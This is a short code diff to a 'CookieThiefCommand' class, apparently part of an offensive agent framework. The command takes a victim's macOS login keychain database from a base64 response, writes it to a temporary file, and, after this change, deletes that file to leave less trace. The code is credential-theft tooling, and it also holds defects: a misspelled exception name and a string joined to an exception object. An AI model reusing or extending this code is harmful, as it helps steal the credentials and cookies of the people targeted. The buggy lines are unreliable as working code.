@@ -67,12 +67,13 @@ class CookieThiefCommand(CommandBase):
             sys.stdout.flush()
 
         try:
-            print(getkeychainDBResp["contents"])
             f = open("tmp_login.keychain-db", "wb")
             f.write(base64.b64decode(getkeychainDBResp["contents"]))
             f.close()
         except execption as e:
             print("Encountered an error attempting to write the keychainDB to a file: " + e)
-            return task
+            sys.stdout.flush()
 
+        os.remove("tmp_login.keychain-db")
+        
         return task
